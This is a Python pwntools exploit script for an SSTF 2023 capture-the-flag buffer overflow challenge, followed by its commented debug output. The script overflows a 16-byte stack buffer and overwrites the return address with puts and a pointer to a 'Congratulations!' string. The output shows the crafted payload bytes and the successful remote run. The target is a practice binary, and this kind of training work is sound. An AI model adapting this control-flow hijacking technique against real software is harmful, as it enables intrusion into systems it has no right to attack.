import pwn

elf = pwn.ELF("./bof102quiz2")
p = elf.process()
pwn.context.log_level="DEBUG"
pr = pwn.remote("bof102.sstf.site", 1336)

puts_addr = elf.symbols['puts']


pr.recvuntil(b"Payload > ")

payload = b"a"*20 # 16 bytes of char payload[16] + 4 bytes EBP
payload += pwn.p32(puts_addr) # address of callme function which is 0x08048400
payload += pwn.p32(0) # Return address for function bofme
payload += pwn.p32(0x804a06c)  #arg1 esp 0xffffcfac —▸ 0x804a06c (msg) ◂— 'Congratulations!'


pr.sendline(payload)
pr.interactive()

  
#    Arch:     i386-32-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x8048000)
#[+] Starting local process '/home/kali/PWN/SSTF2023/bof102quiz2': pid 187438
#[+] Opening connection to bof102.sstf.site on port 1336: Done
#[DEBUG] Received 0x1e bytes:
#    b"Print out 'Congratulations!'.\n"
#[DEBUG] Received 0xa bytes:
#    b'Payload > '
#[DEBUG] Sent 0x21 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  00 84 04 08  00 00 00 00  6c a0 04 08  │aaaa│····│····│l···│
    00000020  0a                                                  │·│
    00000021
#[*] Switching to interactive mode
#[DEBUG] Received 0x4 bytes:
#    b'bye.'
#bye.[DEBUG] Received 0x12 bytes:
#    b'\n'
#    b'Congratulations!\n'
#
#Congratulations!